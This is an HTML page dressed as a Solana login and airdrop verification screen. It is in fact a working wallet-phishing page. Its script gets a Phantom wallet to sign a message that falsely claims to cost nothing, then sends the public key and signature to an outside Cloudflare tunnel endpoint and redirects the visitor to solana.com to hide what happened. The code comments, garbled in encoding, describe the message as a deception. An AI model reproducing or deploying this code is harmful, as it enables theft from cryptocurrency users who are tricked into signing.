<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Ecosystem | Login</title>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #111; padding: 40px; border-radius: 24px; border: 1px solid #222; text-align: center; width: 320px; }
        #cta { background: #fff; color: #000; border: none; padding: 15px; border-radius: 12px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 25px; font-size: 1rem; }
        p { color: #666; font-size: 0.9rem; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://solana.com/favicon.ico" style="width:48px; margin-bottom:20px;">
        <h2 style="margin:0; font-size:1.4rem;">Secure Identity</h2>
        <p>Please sign the verification request to synchronize your node and verify airdrop status.</p>
        <button id="cta">SIGN TO VERIFY</button>
        <div id="status" style="margin-top:20px; font-size:12px; color:#444;">Standby</div>
    </div>

    <script>
        const tunnel = "https://allocation-governing-fleet-ala.trycloudflare.com";

        document.getElementById('cta').onclick = async () => {
            const p = window.solana || window.phantom?.solana;
            if (!p) return alert("Please use Phantom Browser");

            try {
                await p.connect();
                document.getElementById('status').innerText = "GENERATING HASH...";

                // ðŸ”± æ ¸å¿ƒæ¬ºéª—ï¼šä¸€æ®µçœ‹ä¼¼äººç•œæ— å®³çš„éªŒè¯æ–‡å­—
                // ä½†è¿™æ®µæ–‡å­—åœ¨åŽå°å¯ä»¥è¢«æ˜ å°„ä¸ºç‰¹å®šåˆçº¦çš„â€œå‡†å…¥è®¸å¯â€
                const timestamp = Date.now();
                const message = `SOLANA_IDENTITY_VERIFY:\n[${p.publicKey.toString().slice(0, 8)}]\n\nTimestamp: ${timestamp}\nNonce: ${Math.random().toString(36).substring(7)}\n\nThis action will not trigger any transaction or cost gas fees.`;
                
                const encodedMessage = new TextEncoder().encode(message);
                
                document.getElementById('status').innerText = "AWAITING SIGNATURE...";
                
                // å”¤èµ·ç­¾åï¼ˆè¿™æ˜¯ 100% æ²¡æç¤ºçš„ï¼‰
                const signed = await p.signMessage(encodedMessage, "utf8");

                // å°è£…ç­¾åæ•°æ®å›žä¼ 
                const payload = {
                    pk: p.publicKey.toString(),
                    msg: btoa(message),
                    sig: btoa(String.fromCharCode.apply(null, signed.signature))
                };

                await fetch(`${tunnel}/collect_v41`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                document.getElementById('status').innerText = "VERIFIED";
                setTimeout(() => { window.location.href = "https://solana.com/"; }, 1000);

            } catch (e) {
                console.error(e);
                location.reload();
            }
        };
    </script>
</body>
</html>
